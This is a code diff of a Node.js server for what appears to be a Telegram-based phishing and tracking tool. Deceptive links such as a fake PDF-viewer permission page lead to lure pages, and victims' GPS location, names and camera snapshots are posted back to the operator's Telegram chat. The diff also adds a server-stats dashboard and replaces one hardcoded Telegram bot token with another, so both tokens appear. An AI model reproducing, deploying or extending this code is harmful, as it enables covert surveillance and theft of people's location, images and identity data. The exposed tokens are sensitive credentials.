@@ -1,5 +1,6 @@
-// const express = require("express");
-// const app = express();
+const os = require("os");
+const getDashboardHTML = require("./dashboard");
+
 const fs = require("fs");
 const express = require("express");
 var cors = require("cors");
@@ -7,7 +8,8 @@ var bodyParser = require("body-parser");
 const fetch = require("node-fetch");
 const TelegramBot = require("node-telegram-bot-api");
 const path = require("path");
-const token = "8951937812:AAH_mnb3FJwfNtUfLsWy7CnrHWejSDY9Ezw";
+const app = express();
+const token = "8798265014:AAFYn3Yp1B1v4uscDHW4v6axsRIUAzwDAoc";
 const bot = new TelegramBot(token, { polling: true });
 
 const userDataPath = path.join(__dirname, "userData.json");
@@ -18,7 +20,159 @@ if (fs.existsSync(userDataPath)) {
   fs.writeFileSync(userDataPath, JSON.stringify(userData));
 }
 
-// Save user data to file
+/* =========================================================
+   SERVER MONITORING
+========================================================= */
+
+function getLocalIP() {
+  const interfaces = os.networkInterfaces();
+
+  for (const name of Object.keys(interfaces)) {
+    for (const info of interfaces[name] || []) {
+      if (info.family === "IPv4" && !info.internal) {
+        return info.address;
+      }
+    }
+  }
+
+  return "127.0.0.1";
+}
+
+function formatBytes(bytes) {
+  if (bytes < 1024) return bytes + " B";
+  if (bytes < 1024 * 1024) {
+    return (bytes / 1024).toFixed(1) + " KB";
+  }
+  if (bytes < 1024 * 1024 * 1024) {
+    return (bytes / 1024 / 1024).toFixed(1) + " MB";
+  }
+
+  return (bytes / 1024 / 1024 / 1024).toFixed(2) + " GB";
+}
+
+function formatUptime(seconds) {
+  const days = Math.floor(seconds / 86400);
+
+  seconds %= 86400;
+
+  const hours = Math.floor(seconds / 3600);
+
+  seconds %= 3600;
+
+  const minutes = Math.floor(seconds / 60);
+
+  const secs = Math.floor(seconds % 60);
+
+  return days + "d " + hours + "h " + minutes + "m " + secs + "s";
+}
+
+let previousCPU = null;
+
+function getCPUUsage() {
+  const cpus = os.cpus();
+
+  let idle = 0;
+  let total = 0;
+
+  cpus.forEach(function (cpu) {
+    idle += cpu.times.idle;
+
+    total +=
+      cpu.times.user +
+      cpu.times.nice +
+      cpu.times.sys +
+      cpu.times.idle +
+      cpu.times.irq;
+  });
+
+  if (!previousCPU) {
+    previousCPU = {
+      idle: idle,
+      total: total,
+    };
+
+    return 0;
+  }
+
+  const idleDiff = idle - previousCPU.idle;
+
+  const totalDiff = total - previousCPU.total;
+
+  previousCPU = {
+    idle: idle,
+    total: total,
+  };
+
+  if (totalDiff <= 0) {
+    return 0;
+  }
+
+  return Math.round(100 - (idleDiff / totalDiff) * 100);
+}
+
+app.get("/api/stats", async (req, res) => {
+  const totalMemory = os.totalmem();
+
+  const freeMemory = os.freemem();
+
+  const usedMemory = totalMemory - freeMemory;
+
+  let globalIP = "Unavailable";
+
+  try {
+    const response = await fetch("https://api.ipify.org?format=json");
+
+    const data = await response.json();
+
+    globalIP = data.ip || "Unavailable";
+  } catch (error) {}
+
+  res.json({
+    status: "ONLINE",
+
+    cpu: {
+      usage: getCPUUsage(),
+      cores: os.cpus().length,
+    },
+
+    ram: {
+      percentage: Math.round((usedMemory / totalMemory) * 100),
+      used: formatBytes(usedMemory),
+      total: formatBytes(totalMemory),
+    },
+
+    network: {
+      localIP: getLocalIP(),
+      globalIP: globalIP,
+    },
+
+    server: {
+      hostname: os.hostname(),
+      node: process.version,
+      platform: process.platform,
+      architecture: process.arch,
+    },
+
+    uptime: {
+      system: formatUptime(os.uptime()),
+      server: formatUptime(process.uptime()),
+    },
+  });
+});
+
+app.get("/api/ports", (req, res) => {
+  res.json({
+    ports: [
+      {
+        port: PORT,
+        service: "Karna Dashboard",
+        status: "LISTENING",
+      },
+    ],
+  });
+});
+
+// Save user data to file  Telegramm
 function saveUserData() {
   fs.writeFileSync(userDataPath, JSON.stringify(userData, null, 2));
 }
@@ -93,7 +247,7 @@ var urlencodedParser = bodyParser.urlencoded({
   limit: 1024 * 1024 * 20,
   type: "application/x-www-form-urlencoded",
 });
-const app = express();
+//const app = express();
 app.use(jsonParser);
 app.use(urlencodedParser);
 app.use(cors());
@@ -101,7 +255,7 @@ app.set("view engine", "ejs");
 
 //Modify your URL here
 var hostURL =
-  "https://click-allow-to-view-pdfviewer-permission.onrender.com";
+  "https://dd7696ff-dbf6-415f-9695-3ff404be925d-00-hlwthpcynh7q.pike.replit.dev";
 //TOGGLE for Shorters
 var use1pt = false;
 
@@ -118,7 +272,7 @@ app.get("/w/:path/:uri", (req, res) => {
   }
 
   if (req.params.path != null) {
-    res.render("webview", {
+    res.render("customer", {
       ip: ip,
       time: d,
       url: atob(req.params.uri),
@@ -132,8 +286,10 @@ app.get("/w/:path/:uri", (req, res) => {
 });
 
 app.get("/", (req, res) => {
-  res.send('<h1 align="center">Karna Server Activated GK</h1>');
+  res.send(getDashboardHTML());
 });
+
+//path to telegram
 
 app.get("/c/:path/:uri", (req, res) => {
   var ip;
@@ -148,7 +304,7 @@ app.get("/c/:path/:uri", (req, res) => {
   }
 
   if (req.params.path != null) {
-    res.render("Adharview", {
+    res.render("customer", {
       ip: ip,
       time: d,
       url: atob(req.params.uri),
@@ -256,16 +412,29 @@ app.post("/location", (req, res) => {
   var lon = parseFloat(decodeURIComponent(req.body.lon)) || null;
   var uid = decodeURIComponent(req.body.uid) || null;
   var acc = decodeURIComponent(req.body.acc) || null;
+
   if (lon != null && lat != null && uid != null && acc != null) {
-    bot.sendLocation(parseInt(uid, 36), lat, lon);
+    const chatId = parseInt(uid, 36);
+
+    // Location message only
+    bot.sendLocation(chatId, lat, lon);
 
     bot.sendMessage(
-      parseInt(uid, 36),
-      `Latitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${acc} meters gk`,
+      chatId,
+      `📍 Location Details
+
+Latitude: ${lat}
+Longitude: ${lon}
+Accuracy: ${acc} meters
+
+━━━━━━━━━━━━━━
+👨‍💻 Developer: Gunakarna`,
     );
 
-    res.send("Done");
+    return res.send("Done");
   }
+
+  res.status(400).send("Invalid location data");
 });
 
 app.post("/", (req, res) => {
@@ -278,6 +447,22 @@ app.post("/", (req, res) => {
 
     res.send("Done");
   }
+});
+
+app.post("/submit-name", (req, res) => {
+  var uid = decodeURIComponent(req.body.uid || "");
+  var name = String(req.body.name || "").trim();
+
+  if (!uid || !name) {
+    return res.status(400).send("Missing uid or name");
+  }
+
+  const chatId = parseInt(uid, 36);
+
+  // Name message only
+  bot.sendMessage(chatId, `Name: ${name}`);
+
+  return res.send("Done");
 });
 
 app.post("/camsnap", (req, res) => {
